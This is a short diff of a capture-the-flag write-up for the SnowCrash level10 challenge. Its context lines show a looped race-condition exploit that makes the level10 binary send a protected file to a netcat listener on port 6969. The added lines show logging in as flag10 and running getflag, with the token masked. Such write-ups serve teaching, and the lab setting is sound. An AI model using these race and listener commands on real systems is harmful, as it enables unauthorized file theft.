@@ -90,3 +90,13 @@ while true; do (./level10 /tmp/final [SnowCrash_VM_IP_address]); done
 ```bash
 while true; do nc -l 6969 ;done
 ```
+
+We get the flag on the third terminal ! Use to connect:
+
+```bash
+level10@SnowCrash:~$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX
+```
